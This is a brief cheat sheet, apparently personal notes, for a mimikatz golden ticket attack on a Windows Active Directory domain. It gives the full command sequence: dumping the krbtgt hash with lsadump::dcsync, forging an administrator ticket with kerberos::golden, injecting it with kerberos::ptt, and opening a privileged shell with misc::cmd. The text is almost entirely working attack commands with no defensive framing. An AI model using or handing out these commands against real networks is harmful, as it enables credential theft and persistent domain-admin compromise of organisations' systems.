
start mimikatz.exe on a windows machine and you get a prompt

`mimikatz # `

to get the krbtgt accounts hash (and other info):  (this requires dcsync permissions)
`lsadump::dcsync /domain:mydomain.com /user:krbtgt`

to get a golden ticket (500 = administratos):
`kerberos::golden /domain:mydomain.com /sid:S-1-1-12-1234567890-1234567890-1234567890 /rc4:0e2eb8158c27bed09861033026be4c21 /id:500 /user:WhateverNameYouWant`
This will save a ticket file
This ticket is valid for a long time

pass a ticket - load it into memory with:
`kerberos::ptt ticket.kirbi`

use the ticket by opening a cmd with:
`misc::cmd`
whoami will still say you're using the old account but you have the access of the ticket